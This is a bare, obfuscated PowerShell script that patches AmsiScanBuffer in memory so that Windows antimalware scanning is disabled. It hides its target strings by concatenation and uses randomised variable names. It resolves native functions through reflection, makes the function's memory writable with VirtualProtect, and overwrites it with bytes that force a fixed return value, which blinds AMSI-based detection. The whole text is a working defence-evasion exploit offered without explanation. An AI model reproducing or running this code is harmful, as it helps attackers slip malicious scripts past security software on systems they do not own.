function Get-FunctionBaseAddress {
    Param ($NcaxeafGoOHRcNxIEgHTFMzaglTQbR, $VuStIJxuSMGAkLrKXMoDDOIpwPKssJRfWXx)
    $PLTearoDIZTAUQAzeUGGpKysHDGh = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $jPeJzJsXrzhJfVnDdnwTkIFDye = $PLTearoDIZTAUQAzeUGGpKysHDGh.GetMethods() | ? { $_.Name -eq "GetProcAddress" }
    $hdCzpwbaREYdXGMKwOBplvVLdRbvoiiLeTUIAxVaF = $jPeJzJsXrzhJfVnDdnwTkIFDye[0].Invoke($null, ($PLTearoDIZTAUQAzeUGGpKysHDGh.GetMethod('GetModuleHandle').Invoke($null,@($NcaxeafGoOHRcNxIEgHTFMzaglTQbR)), $VuStIJxuSMGAkLrKXMoDDOIpwPKssJRfWXx))
    return $hdCzpwbaREYdXGMKwOBplvVLdRbvoiiLeTUIAxVaF
}
function Get-DelegateType {
    Param ([Type[]] $RWcBuwdccNtSUYMyOWboZYjCOHzYSMHEAKU, [Type] $xsOBckBWhViwObCpAeXPvsaepGt = [Void] )
    $HzlXCETeBmKBSEhKlgouTIz = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $HzlXCETeBmKBSEhKlgouTIz.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $RWcBuwdccNtSUYMyOWboZYjCOHzYSMHEAKU).SetImplementationFlags('Runtime, Managed')
    $HzlXCETeBmKBSEhKlgouTIz.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $xsOBckBWhViwObCpAeXPvsaepGt, $RWcBuwdccNtSUYMyOWboZYjCOHzYSMHEAKU).SetImplementationFlags('Runtime, Managed')
    return $HzlXCETeBmKBSEhKlgouTIz.CreateType()
}
$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[IntPtr]$RzYQpMtZuJCZQzlKmSfQTeEavtzZTPCObTtejYIK = Get-FunctionBaseAddress -NcaxeafGoOHRcNxIEgHTFMzaglTQbR ("am"+"si.dll") -VuStIJxuSMGAkLrKXMoDDOIpwPKssJRfWXx ("Amsi"+"Scan"+"Buffer")
$hxarwCPKRymjvICeibDN = 0
[IntPtr] $LszgEwbNXaSkQBSdmOcwyhCaDTdvpvBLxNQ = Get-FunctionBaseAddress -NcaxeafGoOHRcNxIEgHTFMzaglTQbR ("kern"+"el32.dll") -VuStIJxuSMGAkLrKXMoDDOIpwPKssJRfWXx ("Virtual"+"Protect")
$XUEoMovZebQPwEGqTlFUuPb = Get-DelegateType -RWcBuwdccNtSUYMyOWboZYjCOHzYSMHEAKU @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) -xsOBckBWhViwObCpAeXPvsaepGt ([Bool])
$qHuYGzrAkQUeUiCJYvvRWxVpmguSXJnQGjGaol=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LszgEwbNXaSkQBSdmOcwyhCaDTdvpvBLxNQ, $XUEoMovZebQPwEGqTlFUuPb)
$qHuYGzrAkQUeUiCJYvvRWxVpmguSXJnQGjGaol.Invoke($RzYQpMtZuJCZQzlKmSfQTeEavtzZTPCObTtejYIK, [uint32]5, 0x40, [ref]$hxarwCPKRymjvICeibDN)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $RzYQpMtZuJCZQzlKmSfQTeEavtzZTPCObTtejYIK, 6)

